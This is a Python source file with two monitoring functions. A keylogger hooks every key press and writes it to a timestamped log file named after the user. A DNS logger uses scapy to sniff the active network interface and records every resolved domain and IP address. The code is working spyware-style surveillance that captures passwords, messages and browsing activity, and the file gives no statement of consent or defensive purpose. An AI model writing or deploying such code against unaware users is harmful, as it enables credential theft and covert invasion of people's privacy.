from utilities import current_time, user_name, active_interface
import logging
import keyboard
import scapy.all as scapy

#key logger
def key_logger():
    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # define a callback function to process the keystrokes
    def on_key_press(event):
        # get the name of the pressed key
        key = event.name
        # write the keystroke to the log file
        logging.info(key)
    # hook the keyboard events with the callback function
    keyboard.on_press(on_key_press)
    # start the hook and keep the script running
    keyboard.wait()

#dns logger
def dns_logger():
    # Set up the logging configuration
    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # Define a function to process each packet
    def process_packet(packet):
        # Check if the packet has a DNS layer and a DNS response
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
            # Check if the packet has any answers in the DNS response
            if packet[scapy.DNS].an is not None:
                # Loop through each answer in the DNS response
                for answer in packet[scapy.DNS].an:
                    # Check if the answer is an A record
                    if answer.type == 1:
                        # Get the domain name and the IP address from the answer
                        domain = answer.rrname.decode('utf-8')
                        ip = answer.rdata
                        # Log the domain name and the IP address
                        logging.info(f'A record: {domain} -> {ip}')
    # Sniff packets on the network interface and pass them to the process_packet function
    scapy.sniff(iface=active_interface(), store=False, prn=process_packet)